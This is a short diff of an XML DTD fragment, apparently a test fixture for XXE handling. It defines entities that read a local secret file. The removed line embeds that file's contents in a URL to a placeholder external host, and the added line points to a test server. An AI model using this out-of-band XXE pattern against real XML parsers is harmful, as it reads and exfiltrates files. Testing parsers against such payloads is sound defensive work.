@@ -1,5 +1,5 @@
 <!ENTITY % payload SYSTEM "file:///src/something-very-secret">
-<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://afaafdsafdasfafdsfafaslll.do-not-exist.%payload;">'>
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://testing-kotlin-server.herokuapp.com/">'>
 
 %param1;
 %external;
